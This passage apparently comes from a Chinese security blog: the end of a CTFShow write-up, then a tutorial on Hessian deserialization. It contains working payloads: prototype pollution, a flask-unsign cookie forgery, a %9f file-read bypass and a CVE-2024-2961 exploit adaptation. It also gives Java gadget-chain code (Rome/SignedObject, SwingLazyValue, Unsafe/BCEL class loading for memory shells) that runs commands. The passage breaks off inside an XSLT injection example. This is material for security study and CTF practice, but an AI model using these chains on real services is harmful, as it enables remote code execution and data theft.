所以需要以下几步来拿 flag\n通过原型污染修改 SECRET_KEY\n通过原型污染修改 jinja_env，以修改引用变量的语法\n用 unicode 转义序列绕过黑名单检查\n{\u0026quot;\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f\u0026quot;: {\u0026quot;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f\u0026quot;: {\u0026quot;\\u0061\\u0070\\u0070\u0026quot;: {\u0026quot;config\u0026quot;: {\u0026quot;SECRET\\u005fKEY\u0026quot;: \u0026quot;ctfshow\u0026quot;}, \u0026quot;\\u006a\\u0069\\u006e\\u006a\\u0061\\u005f\\u0065\\u006e\\u0076\u0026quot;: {\u0026quot;\\u0076\\u0061\\u0072\\u0069\\u0061\\u0062\\u006c\\u0065\\u005f\\u0073\\u0074\\u0061\\u0072\\u0074\\u005f\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067\u0026quot;: \u0026quot;[#\u0026quot;,\u0026quot;\\u0076\\u0061\\u0072\\u0069\\u0061\\u0062\\u006c\\u0065\\u005f\\u0065\\u006e\\u0064\\u005f\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067\u0026quot;: \u0026quot;#]\u0026quot;}}}}} 使用和 SECRET_KEY 相同的密码登录会话，访问 /admin\nflask-unsign --cookie \u0026quot;{'password': 'ctfshow', 'username': 'adminer'}\u0026quot; --secret ctfshow --sign Ezzz_php \u0026lt;?php highlight_file(__FILE__); error_reporting(0); function substrstr($data) { $start = mb_strpos($data, \u0026quot;[\u0026quot;); $end = mb_strpos($data, \u0026quot;]\u0026quot;); return mb_substr($data, $start + 1, $end - 1 - $start); } class read_file{ public $start; public $filename=\u0026quot;/etc/passwd\u0026quot;; public function __construct($start){ $this-\u0026gt;start=$start; } public function __destruct(){ if($this-\u0026gt;start == \u0026quot;gxngxngxn\u0026quot;){ echo 'What you are reading is:'.file_get_contents($this-\u0026gt;filename); } } } if(isset($_GET['start'])){ $readfile = new read_file($_GET['start']); $read=isset($_GET['read'])?$_GET['read']:\u0026quot;I_want_to_Read_flag\u0026quot;; if(preg_match(\u0026quot;/\\[|\\]/i\u0026quot;, $_GET['read'])){ die(\u0026quot;NONONO!!!\u0026quot;); } $ctf = substrstr($read.\u0026quot;[\u0026quot;.serialize($readfile).\u0026quot;]\u0026quot;); unserialize($ctf); }else{ echo \u0026quot;Start_Funny_CTF!!!\u0026quot;; } Start_Funny_CTF!!! 我们可以控制的是 start 和 read 两个请求参数，但 start 的作用不大，需要想办法通过 read 参数将 read_file 的序列化字符串赋值给 $ctf 以实现任意文件读取\n赋值 $ctf 变量前会通过 substrstr 提取中括号内的子字符串，所以 payload 要放到中括号里面(?read=[payload])，但中括号又被过滤了，需要想办法绕过\n从这篇文章可以了解到 PHP 的 mb_strpos 和 mb_substr 函数在处理 UTF-8 前导字节 f0 （意味着字符长度为四个字节）时有一点区别，总结一下有以下三点：\nmb_substr 遇到 f0 时会直接把它和接着的 3 个字节当作一个编码字符，即使后面的字节不符合 UTF-8 编码\nmb_strpos 遇到 f0 会继续读取后续字节，直到读取完整的四字节的编码字符，如果遇到不符合编码的字节，就会把前面的字节当成一个编码字符\nmb_strpos 遇到中间字节 9f 会直接跳过，而 mb_substr 不会，也就是说如果先通过 mb_strpos 定位某个字符再用 mb_substr 截取，在前面添加 9f 会导致截取时的 index 比实际上的 index 要靠前\n利用以上第三点，我们可以构造 payload 使得 substrstr 提取到中括号左侧的字符串，刚好 $read 是拼接到中括号前面（左侧），那么就不需要在 payload 中加中括号了，利用 9f 把截取结果偏移到 payload 上就好了\n⚠️ 这个 bug 在 PHP 8.3 修了，本地测试时注意要用旧版本\n需要向左偏移几个字节长度，就在前面加几个 9f 字节，还要多偏移一个字节代替 [ ，同时要保证中括号内的字符串长度和左侧的 payload 长度一致\n验证一下读取 /proc/self/cmdline\n/?start=gxngxngxnaaaaaa\u0026amp;read=%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9fO%3a9%3a\u0026quot;read_file\u0026quot;%3a2%3a{s%3a5%3a\u0026quot;start\u0026quot;%3bs%3a9%3a\u0026quot;gxngxngxn\u0026quot;%3bs%3a8%3a\u0026quot;filename\u0026quot;%3bs%3a18%3a\u0026quot;/proc/self/cmdline\u0026quot;%3b} 尝试了一下发现 flag 不是常规位置，还需要进一步利用\nCVE-2024-2961 可以将 PHP 的任意文件读取漏洞升级为命令执行，有现成的 exp，修改一下 Remote 的方法即可\nclass Remote: ... def send(self, path: str) -\u0026gt; Response: \u0026quot;\u0026quot;\u0026quot;Sends given `path` to the HTTP server. Returns the response. \u0026quot;\u0026quot;\u0026quot; payload = f'O:9:\u0026quot;read_file\u0026quot;:2:{{s:5:\u0026quot;start\u0026quot;;s:9:\u0026quot;gxngxngxn\u0026quot;;s:8:\u0026quot;filename\u0026quot;;s:{len(path)}:\u0026quot;{path}\u0026quot;;}}' return self.session.get( self.url, params=urllib.parse.urlencode( { \u0026quot;start\u0026quot;: f\u0026quot;{'a'*(len(payload)-74)}\u0026quot;, \u0026quot;read\u0026quot;: f\u0026quot;{'%9f'*(len(payload) + 1)}{payload}\u0026quot;, }, safe=\u0026quot;%\u0026quot;, ), # proxies={ # \u0026quot;http\u0026quot;: \u0026quot;http://localhost:8080\u0026quot;, # \u0026quot;https\u0026quot;: \u0026quot;http://localhost:8080\u0026quot;, # }, ) def download(self, path: str) -\u0026gt; bytes: \u0026quot;\u0026quot;\u0026quot;Returns the contents of a remote file. \u0026quot;\u0026quot;\u0026quot; path = f\u0026quot;php://filter/convert.base64-encode/resource={path}\u0026quot; response = self.send(path) data = response.re.search(b\u0026quot;What you are reading is:(.*)\u0026quot;, flags=re.S).group(1) return base64.decode(data) ./cnext-exploit.py http://2f8a3833-8e81-4d3d-a99d-1d9c0d1cf7ad.challenge.ctf.show/ 'cat /must_rCE_F1nd_This_flag \u0026gt; /var/www/html/flag.txt' [TODO] NewerFileDetector Magika 是谷歌推出的一款新型 AI 文件类型检测工具，据说 Magika 的准确率和召回率达到 99% 以上。看 来开发再也不需要担心文件上传漏洞了。\n未完持续\u0026hellip;","date":"2024-12-24","permalink":"https://zrquan.github.io/posts/ctf-show/","tags":["ctf","writeup"],"title":"CTF Show 刷题记录"},{"content":"Hessian 是一个二进制 Web 协议的实现，由 caucho 公司主导开发，其目的是实现一个轻量级、跨语言、自描述（不依赖外部定义）的二进制通信协议\nHello Hessian Hessian 基于 HTTP 进行数据传输，一般会像常规的 Web 服务一样提供一个 API 被客户端调用。以 Servlet 项目为例，和常规 Web 服务一样绑定路由，通过 Tomcat 部署\n示例：Servlet 和普通的 Servlet 配置差不多，但是需要继承 HessianServlet\npublic class Hello extends HessianServlet implements Greeting { @Override public String sayHello(String name) { return \u0026quot;Hello, \u0026quot; + name; } } \u0026lt;web-app\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;greeting\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;org.example.Hello\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;greeting\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/hello\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;/web-app\u0026gt; Code Snippet 1: web.xml 打包成 war 之后直接用 tomcat 部署即可\ndocker run -it --rm \\ -e 'JPDA_ADDRESS=*:8000' \\ -e JPDA_TRANSPORT=dt_socket \\ -p 8888:8080 \\ -p 9000:8000 \\ -v ./hessian.war:/usr/local/tomcat/webapps/hessian.war \\ tomcat:9.0 \\ /usr/local/tomcat/bin/catalina.sh jpda run 客户端使用 Hessian 的工厂类构建一个动态代理对象，实现对远程对象的方法调用\npublic class Client { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException { String url = \u0026quot;http://localhost:8888/hessian/hello\u0026quot;; HessianProxyFactory factory = new HessianProxyFactory(); Greeting greeting = (Greeting) factory.create(Greeting.class, url); System.out.println(\u0026quot;Hessian server say: \u0026quot; + greeting.sayHello(\u0026quot;client\u0026quot;)); } } Code Snippet 2: Hessian Client Hessian 通常是基于 HTTP 协议进行数据传输的，使用的是 POST 方法\n63 02 00 6d 00 08 73 61 79 48 65 6c 6c 6f 53 00 06 63 6c 69 65 6e 74 7a c..m..sayHelloS..clientz 示例：SpringBoot 在 SpringBoot 中可以用 org.springframework.remoting.caucho.HessianServiceExporter 来注册服务，注意 remoting 模块在最新版本中默认是不提供的，建议使用低版本进行测试\n通过注解进行配置还是比较简单的，demo 代码可以参考这里\n@Configuration @ComponentScan @EnableAutoConfiguration public class Application { @Autowired private Hello greeting; // 注意给 Hello 类添加 @Service 注解 public static void main(String[] args) { SpringApplication.run(Application.class, args); } @Bean(name = \u0026quot;/hello\u0026quot;) public RemoteExporter helloService() { HessianServiceExporter exporter = new HessianServiceExporter(); exporter.setService(greeting); exporter.setServiceInterface(Greeting.class); return exporter; } } Client 代码和前文一样，访问 :8080/hello 即可调用 Hessian 服务\n远程调用过程 HessianServlet HessianServlet 是 HTTPServlet 的子类，所以我们重点关注两个方法：\ninit：负责初始化 Servlet 对象 service：负责处理和响应 HTTP 请求 在 init 方法中，主要是初始化一些成员变量，比如我们定义的 Hello 对象和它的类型信息；还有 skeleton 对象，用来处理来自客户端的数据，完成远程方法调用\nservice 方法是整个 RPC 处理过程的入口点，我们从这里开始探索 Hessian 的服务调用实现逻辑\n首先会检查是不是 POST 请求，如果不是的话会直接返回 500 错误码 接着用 ServiceContext 类保存一些上下文对象（ request 、response 等等） 初始化序列化工厂对象 SerializerFactory 再进入 com.caucho.hessian.server.HessianSkeleton#invoke(InputStream, OutputStream, SerializerFactory) 方法 HessianSkeleton HessianSkeleton 是 AbstractSkeleton 的子类，其功能类似于动态代理，将实际的服务对象进行封装，提供给客户端调用，在调用过程中就涉及到二进制数据的序列化和反序列化\nAbstractSkeleton 初始化时会从服务对象的接口（类）中获取所有方法并保存在 _methodMap 中\nprotected AbstractSkeleton(Class apiClass) { _apiClass = apiClass; Method []methodList = apiClass.getMethods(); for (int i = 0; i \u0026lt; methodList.length; i++) { Method method = methodList[i]; if (_methodMap.get(method.getName()) == null) _methodMap.put(method.getName(), methodList[i]); Class []param = method.getParameterTypes(); String mangledName = method.getName() + \u0026quot;__\u0026quot; + param.length; _methodMap.put(mangledName, methodList[i]); _methodMap.put(mangleName(method, false), methodList[i]); } } 每个方法会在 _methodMap 中生成三组键值对，key 分别为：\n1. 方法名 2. 方法名__参数个数 3. 方法名_参数1类型_参数2类型 服务对象则保存在私有属性 HessianSkeleton#_service 中\n客户端调用服务时调用 HessianSkeleton#invoke ，会读取二进制数据的头部判断协议的版本，比如前文的数据以 63 02 开头，服务端则会用 HessianInput 进行反序列化，然后用 Hessian2Output 对返回数据进行序列化（CALL_1_REPLY_2）\npublic HeaderType readHeader(InputStream is) throws IOException { int code = is.read(); int major = is.read(); int minor = is.read(); switch (code) { case -1: throw new IOException(\u0026quot;Unexpected end of file for Hessian message\u0026quot;); case 'c': if (major \u0026gt;= 2) return HeaderType.CALL_1_REPLY_2; else return HeaderType.CALL_1_REPLY_1; case 'r': return HeaderType.REPLY_1; case 'H': return HeaderType.HESSIAN_2; default: throw new IOException((char) code + \u0026quot; 0x\u0026quot; + Integer.toHexString(code) + \u0026quot; is an unknown Hessian message code.\u0026quot;); } } Code Snippet 3: com.caucho.hessian.io.HessianInputFactory#readHeader switch (header) { case CALL_1_REPLY_1: in = _hessianFactory.createHessianInput(is); out = _hessianFactory.createHessianOutput(os); break; case CALL_1_REPLY_2: in = _hessianFactory.createHessianInput(is); out = _hessianFactory.createHessian2Output(os); break; case HESSIAN_2: in = _hessianFactory.createHessian2Input(is); in.readCall(); out = _hessianFactory.createHessian2Output(os); break; default: throw new IllegalStateException(header + \u0026quot; is an unknown Hessian call\u0026quot;); } Code Snippet 4: com.caucho.hessian.server.HessianSkeleton#invoke 设置好输入输出流之后，根据前文提到的 _methodMap 找到要执行的方法，通过 HessianSkeleton#_service 进行反射调用，再将调用结果返回给客户端\n协议版本 我们现在知道，即使 Hessian 协议已经迭代到 2.0 版本，仍然可以和 1.0 版本混用，默认情况下使用 CALL_1_REPLY_2，即客户端发送 1.0 协议数据，服务端返回 2.0 协议数据\n想要客户端发送 2.0 协议数据需要显式设置\nHessianProxyFactory factory = new HessianProxyFactory(); factory.setHessian2Request(true); 序列化过程 Hessian 定义了 AbstractHessianInput/AbstractHessianOutput 两个抽象类，用来提供序列化数据的读取和写入功能。从前文我们可以知道，根据协议版本不同，提供了 Hessian/Hessian2/Burlap 等几种不同的具体实现\n我们先通过 Client 示例简单看看序列化的过程\n首先要使用 HessianProxyFactory 来创建一个动态代理对象来代理远程的服务对象，当调用任意方法时实际执行的是 com.caucho.hessian.client.HessianProxy#invoke ，发送请求时通过 HessianOutput#writeObject 来写入序列化数据\nwriteObject:315, HessianOutput (com.caucho.hessian.io) call:132, HessianOutput (com.caucho.hessian.io) sendRequest:293, HessianProxy (com.caucho.hessian.client) invoke:171, HessianProxy (com.caucho.hessian.client) sayHello:-1, $Proxy0 (com.sun.proxy) main:13, Client 根据不同的序列化数据类型，会从工厂类中获取对应的序列化器实现，通常是 BasicSerializer 实现\npublic void writeObject(Object object) throws IOException { if (object == null) { writeNull(); return; } Serializer serializer; serializer = _serializerFactory.getSerializer(object.getClass()); serializer.writeObject(object, this); } Code Snippet 5: com.caucho.hessian.io.HessianOutput#writeObject ContextSerializerFactory#_serializerClassMap 在开始进行数据序列化时，会调用 com.caucho.hessian.io.AbstractHessianOutput#writeObjectBegin ，在 1.0 版本时会把所有数据都写在一个 Map 容器里面，Hessian2Output 则重写了该方法，根据类型写入其描述信息\n/** * Writes the object header to the stream (for Hessian 2.0), or a * Map for Hessian 1.0. Object writers will call * ... */ public int writeObjectBegin(String type) throws IOException { writeMapBegin(type); return -2; } Serializable 和 transient 逐步调试 HessianOutput#writeObject 的过程中，我们可以注意到两个比较关键的判断逻辑。在工厂类获取序列化器时，会判断目标类有没有实现 Serializable 接口，这很合理，但条件是这样的：\nif (! Serializable.class.isAssignableFrom(cl) \u0026amp;\u0026amp; ! _isAllowNonSerializable) { throw new IllegalStateException(\u0026quot;Serialized class \u0026quot; + cl.getName() + \u0026quot; must implement java.io.Serializable\u0026quot;); } 也就是还有一个 _isAllowNonSerializable 属性可以让没有实现 Serializable 接口的类进行序列化\n继续调试，工厂类默认获取的序列化器是 UnsafeSerializer，它会跳过所有被 transient 和 static 修饰的成员变量\nif (Modifier.isTransient(field.getModifiers()) || Modifier.isStatic(field.getModifiers())) { continue; } Code Snippet 6: com.caucho.hessian.io.UnsafeSerializer#introspect 反序列化过程 反序列化过程和 AbstractHessianInput 的子类密切相关，入口方法和原生反序列化一样（名字一样）都是 readObject，以 HessianInput 为例，在 readObject 方法中会根据 tag 判断数据的类型，然后使用对应的 Deserializer 去处理。由于 Hessian1.0 会把序列化数据都放在一个 Map 中，所以会像下图一样通过 readMap 处理：\n在 readMap 中会将数据进行反序列化，然后将对象放到 HashMap 或者 TreeMap 的键值对里\npublic Object readMap(AbstractHessianInput in) throws IOException { Map map; if (_type == null) map = new HashMap(); else if (_type.equals(Map.class)) map = new HashMap(); else if (_type.equals(SortedMap.class)) map = new TreeMap(); else { try { map = (Map) _ctor.newInstance(); } catch (Exception e) { throw new IOExceptionWrapper(e); } } in.addRef(map); while (! in.isEnd()) { map.put(in.readObject(), in.readObject()); } in.readEnd(); return map; } 看到这里我们应该意识到 Hessian 反序列化漏洞的入口在哪了，虽然在反序列过程中不会像原生反序列化一样触发 readObject 方法，也不会像 FastJSON 一样调用 getter/setter，但这个 readMap 方法中的 map.put 操作成了漏网之鱼\n众所周知，HashMap 在执行 put 操作时会调用 key 的 hashCode 和 equals 方法，这在很多现有的链中被利用到；而 TreeMap 在执行 put 操作时也会调用 key 的 compareTo 方法\n如果是 Hessian2.0 的序列化数据，数据流的 tag 是 C ，最后会根据类型描述信息由 sun.misc.Unsafe#allocateInstance 方法进行反序列化对象的初始化，这个方法是一个 native 方法，没有办法进行利用\ninstantiate:306, UnsafeDeserializer (com.caucho.hessian.io) readObject:148, UnsafeDeserializer (com.caucho.hessian.io) readObjectInstance:2219, Hessian2Input (com.caucho.hessian.io) readObject:2140, Hessian2Input (com.caucho.hessian.io) readObject:2124, Hessian2Input (com.caucho.hessian.io) readObject:1677, Hessian2Input (com.caucho.hessian.io) invoke:296, HessianSkeleton (com.caucho.hessian.server) invoke:198, HessianSkeleton (com.caucho.hessian.server) invoke:399, HessianServlet (com.caucho.hessian.server) service:379, HessianServlet (com.caucho.hessian.server) 利用链分析 根据以上反序列化过程的分析，我们可以总结出 Hessian 的利用链的特征：\n入口方法是 hashCode/equals/compareTo 其中之一 利用类可以不实现 Serializable 接口，但是 transient 成员变量不能利用 利用类的 readObject 不会自动触发，除非在利用链上显式调用（二次反序列化） Rome Rome 是一个用于 RSS 和 Atom 订阅的 Java 框架，在 marshalsec 中就用它的 ToStringBean 和 EqualsBean 等类构造出了 Hessian 利用链\nEqualsBean 在 hashCode 中可以执行任意对象的 toString 方法\npublic class EqualsBean implements Serializable { public int hashCode() { return beanHashCode(); } // ... public int beanHashCode() { return obj.toString().hashCode(); } } 而 ToStringBean#toString 可以调用他封装类的全部无参 getter 方法，那么可以用 JdbcRowSetImpl#getDatabaseMetaData 进行 JNDI 注入\n在不出网的情况下还可以利用 java.security.SignedObject#getObject 触发原生反序列化链（二次反序列化）\ngetObject:179, SignedObject (java.security) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:497, Method (java.lang.reflect) toString:158, ToStringBean (com.rometools.rome.feed.impl) toString:129, ToStringBean (com.rometools.rome.feed.impl) beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl) hashCode:180, EqualsBean (com.rometools.rome.feed.impl) hash:338, HashMap (java.util) put:611, HashMap (java.util) readMap:114, MapDeserializer (com.caucho.hessian.io) readMap:538, SerializerFactory (com.caucho.hessian.io) readObject:1160, HessianInput (com.caucho.hessian.io) Code Snippet 1: SignedObject 链调用栈 利用 TemplatesImpl 原生反序列化利用链执行命令 public class SignedObjectGadget { public static void main(String[] args) throws Exception { byte[] code = getTemplates(); byte[][] codes = {code}; TemplatesImpl templates = new TemplatesImpl(); setValue(templates, \u0026quot;_tfactory\u0026quot;, new TransformerFactoryImpl()); setValue(templates, \u0026quot;_name\u0026quot;, \u0026quot;Aiwin\u0026quot;); setValue(templates, \u0026quot;_class\u0026quot;, null); setValue(templates, \u0026quot;_bytecodes\u0026quot;, codes); ToStringBean toStringBean = new ToStringBean(Templates.class, templates); EqualsBean equalsBean = new EqualsBean(String.class, \u0026quot;aiwin\u0026quot;); HashMap hashMap = new HashMap(); hashMap.put(equalsBean, \u0026quot;aaa\u0026quot;); setValue(equalsBean, \u0026quot;beanClass\u0026quot;, ToStringBean.class); setValue(equalsBean, \u0026quot;obj\u0026quot;, toStringBean); //SignedObject KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026quot;DSA\u0026quot;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap, kp.getPrivate(), Signature.getInstance(\u0026quot;DSA\u0026quot;)); ToStringBean toStringBean_sign = new ToStringBean(SignedObject.class, signedObject); EqualsBean equalsBean_sign = new EqualsBean(String.class, \u0026quot;aiwin\u0026quot;); HashMap hashMap_sign = new HashMap(); hashMap_sign.put(equalsBean_sign, \u0026quot;aaa\u0026quot;); setValue(equalsBean_sign, \u0026quot;beanClass\u0026quot;, ToStringBean.class); setValue(equalsBean_sign, \u0026quot;obj\u0026quot;, toStringBean_sign); String result = Hessian_serialize(hashMap_sign); Hessian_unserialize(result); } public static void setValue(Object obj, String name, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); } public static byte[] getTemplates() throws IOException, CannotCompileException, NotFoundException { ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.makeClass(\u0026quot;Test\u0026quot;); ctClass.setSuperclass(classPool.get(\u0026quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026quot;)); String block = \u0026quot;Runtime.getRuntime().exec(\\\u0026quot;kcalc\\\u0026quot;);\u0026quot;; ctClass.makeClassInitializer().insertBefore(block); return ctClass.toBytecode(); } public static String Hessian_serialize(Object object) throws IOException { ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream); hessianOutput.writeObject(object); return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()); } public static void Hessian_unserialize(String obj) throws IOException { byte[] code = Base64.getDecoder().decode(obj); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(code); HessianInput hessianInput = new HessianInput(byteArrayInputStream); hessianInput.readObject(); } } Swing 这是一条 JDK 原生的反序列化链，这条链的 sink 点在 sun.swing.SwingLazyValue#createValue 方法中\npublic Object createValue(UIDefaults var1) { try { ReflectUtil.checkPackageAccess(this.className); Class var2 = Class.forName(this.className, true, (ClassLoader)null); if (this.methodName != null) { Class[] var6 = this.getClassArray(this.args); Method var7 = var2.getMethod(this.methodName, var6); this.makeAccessible(var7); // 注意 var2 是一个 Class 对象，所以我们只能利用类方法 return var7.invoke(var2, this.args); } else { Class[] var3 = this.getClassArray(this.args); Constructor var4 = var2.getConstructor(var3); this.makeAccessible(var4); return var4.newInstance(this.args); } } catch (Exception var5) { return null; } } 这个方法有两个利用点，我们可以通过指定 methodName 来反射调用任意方法，也可以将 methodName 置空来触发一个类的初始化操作。其实这个类在 Xstream 的 CVE-2021-21346 就被利用过，当时的 gadget 为：\nRdn$RdnEntry#compareTo-\u0026gt; XString#equal-\u0026gt; MultiUIDefaults#toString-\u0026gt; UIDefaults#get-\u0026gt; UIDefaults#getFromHashTable-\u0026gt; UIDefaults$LazyValue#createValue-\u0026gt; SwingLazyValue#createValue-\u0026gt; InitialContext#doLookup() 由于 MultiUIDefaults 不是 public 类，这个 gadget 无法复用到 Hessian 中，我们还需要找到一个入口触发 UIDefaults#get\n找到代替品 javax.activation.MimeTypeParameterList#toString ，它会执行 parameters 成员变量的 get 方法\npublic String toString() { StringBuffer buffer = new StringBuffer(); buffer.ensureCapacity(this.parameters.size() * 16); Enumeration keys = this.parameters.keys(); while(keys.hasMoreElements()) { String key = (String)keys.nextElement(); buffer.append(\u0026quot;; \u0026quot;); buffer.append(key); buffer.append('='); buffer.append(quote((String)this.parameters.get(key))); } return buffer.toString(); } 至于 toString 方法，可以利用 Hessian2Input#expect 触发，这是一个用来打印类型错误信息的方法，Hessian 在反序列化时需要从数据流读取标志字节（ tag ）来判断接下来的数据是什么类型，以此来保证使用正确的方法还原对象，比如之前我们看到过 M 代表 Map 类型的对象，会调用 readMap 方法处理\n当读取到的 tag 和预期不符时，会调用 Hessian2Input#expect 来输出错误信息，这时会将剩下的数据用 readObject 方法进行反序列化，然后和字符串拼接生成错误信息，这时候会隐式执行对象的 toString 方法\nObject obj = readObject(); if (obj != null) { return error(\u0026quot;expected \u0026quot; + expect + \u0026quot; at 0x\u0026quot; + Integer.toHexString(ch \u0026amp; 0xff) + \u0026quot; \u0026quot; + obj.getClass().getName() + \u0026quot; (\u0026quot; + obj + \u0026quot;)\u0026quot; + \u0026quot;\\n \u0026quot; + context + \u0026quot;\u0026quot;); 那么怎么触发 Hessian2Input#expect 呢？经过调试可以发现，在反序列化 MimeTypeParameterList 或者其他自定义对象时，会调用 readObjectDefinition 获取类名信息，这时就会使用 readString 来获取类名字符串\n很容易想到，我们在序列化数据中，将开头代表自定义类型的标志 C 多写入一个，那么在 readString 方法中读取到的仍然是完整的 MimeTypeParameterList 对象，这时候就会因为 tag 不是代表字符串而进入 expect 方法，将 MimeTypeParameterList 反序列化，并触发它的 toString 方法\nByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); Hessian2Output out = new Hessian2Output(byteArrayOutputStream); out.getSerializerFactory().setAllowNonSerializable(true); out.writeObject(object); out.flushBuffer(); byte[] origin = byteArrayOutputStream.toByteArray(); byte[] payload = new byte[origin.length + 1]; System.arraycopy(new byte[]{'C'}, 0, payload, 0, 1); System.arraycopy(origin, 0, payload, 1, origin.length); Code Snippet 7: 在序列化数据开头添加 C (byte) exec:347, Runtime (java.lang) ... invoke:275, MethodUtil (sun.reflect.misc) ... invoke:497, Method (java.lang.reflect) [1] createValue:73, SwingLazyValue (sun.swing) getFromHashtable:216, UIDefaults (javax.swing) get:161, UIDefaults (javax.swing) toString:253, MimeTypeParameterList (javax.activation) valueOf:2994, String (java.lang) append:131, StringBuilder (java.lang) expect:2880, Hessian2Input (com.caucho.hessian.io) readString:1398, Hessian2Input (com.caucho.hessian.io) readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io) readObject:2122, Hessian2Input (com.caucho.hessian.io) Code Snippet 2: 调用栈 不出网利用 通过反射调用任意方法可以做到 RCE，但在无法出网的情境下，单纯的 RCE 也难以有效利用。如果可以借助 SwingLazyValue#createValue 初始化任意类，那么就可以写入内存马\nUnsafe sun.misc.Unsafe#defineClass 可以通过字节数组动态定义一个类， SwingLazyValue#createValue 又可以利用来加载和初始化一个类，结合两者我们就能够实现任意类初始化，以此执行任意代码\n整个利用过程需要触发两次反序列化漏洞，第一次通过反射调用 defineClass 定义任意类，假设为 Exploit\nMethod invoke = MethodUtil.class.getMethod(\u0026quot;invoke\u0026quot;, Method.class, Object.class, Object[].class); Method defineClass = Unsafe.class.getDeclaredMethod(\u0026quot;defineClass\u0026quot;, String.class, byte[].class, int.class, int.class, ClassLoader.class, ProtectionDomain.class); Field f = Unsafe.class.getDeclaredField(\u0026quot;theUnsafe\u0026quot;); f.setAccessible(true); Object unsafe = f.get(null); Object[] args = new Object[]{invoke, new Object(), new Object[]{defineClass, unsafe, new Object[]{\u0026quot;exp\u0026quot;, payload, 0, payload.length, null, null}}}; // payload 为 Exploit 类字节数组 SwingLazyValue swingLazyValue = new SwingLazyValue(\u0026quot;sun.reflect.misc.MethodUtil\u0026quot;, \u0026quot;invoke\u0026quot;, args); 成功定义 Exploit 类后加载并初始化，需要将 methodName 设置为 null\nSwingLazyValue swingLazyValue = new SwingLazyValue(\u0026quot;Exploit\u0026quot;, null, new Object[0]); BCEL BCEL（Byte Code Engineering Library）是一个由 Apache Commons 提供的库，用于分析、创建和修改 Java 字节码，而 com.sun.org.apache.bcel.internal.util.JavaWrapper#_main 可以从 BCEL 格式的对象字符串中动态构建对象\nSwingLazyValue slz = new SwingLazyValue(\u0026quot;com.sun.org.apache.bcel.internal.util.JavaWrapper\u0026quot;, \u0026quot;_main\u0026quot;, new Object[]{new String[]{payload}}); // payload 是恶意类的 BCEL 字符串 调用栈 _main:153, JavaWrapper (com.sun.org.apache.bcel.internal.util) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:497, Method (java.lang.reflect) createValue:73, SwingLazyValue (sun.swing) getFromHashtable:216, UIDefaults (javax.swing) get:161, UIDefaults (javax.swing) toString:253, MimeTypeParameterList (javax.activation) valueOf:2994, String (java.lang) append:131, StringBuilder (java.lang) expect:2880, Hessian2Input (com.caucho.hessian.io) readString:1398, Hessian2Input (com.caucho.hessian.io) readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io) readObject:2122, Hessian2Input (com.caucho.hessian.io) XSLT XSLT 是一种样式转换标记语言，可以将 XML 文档转换成其他格式，比如 HTML。XSLT 包含了超过 100 个内置函数, 这些函数可以用于字符串、数值、日期和时间比较、节点和 QName 处理, 序列处理, 逻辑判断等等\n我们可以将 XSLT 想象成模板引擎，在利用 SSTI 时我们通常需要用模板语言定义多个中间变量去构造完整的 payload，XSLT 也提供了定义变量的元素 variable\n\u0026lt;xsl:variable name=\u0026quot;name\u0026quot; select=\u0026quot;expression\u0026quot;\u0026gt; \u0026lt;!-- Content:template --\u0026gt; \u0026lt;/xsl:variable\u0026gt; 其中 select 属性是一个表达式，可以灵活地通过各种功能函数去获取变量的值，如果没有控制好边界，攻击者可以通过 select 属性直接调用底层语言的方法/函数。比如：\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;utf-8\u0026quot;?\u0026gt; \u0026lt;xsl:stylesheet version=\u0026quot;1.0\u0026quot; xmlns:xsl=\u0026quot;http://www.w3.org/1999/XSL/Transform\u0026quot; xmlns:rt=\u0026quot;http://xml.apache.org/xalan/java/java.lang.Runtime\u0026quot; xmlns:ob=\u0026quot;http://xml.apache.org/xalan/java/java.lang.Object\u0026quot;\u0026gt; \u0026lt;xsl:template match=\u0026quot;/\u0026quot;\u0026gt; \u0026lt;xsl:variable name=\u0026quot;rtobject\u0026quot; select=\u0026quot;rt:getRuntime()\u0026quot;/\u0026gt; \u0026lt;xsl:variable name=\u0026quot;process\u0026quot; 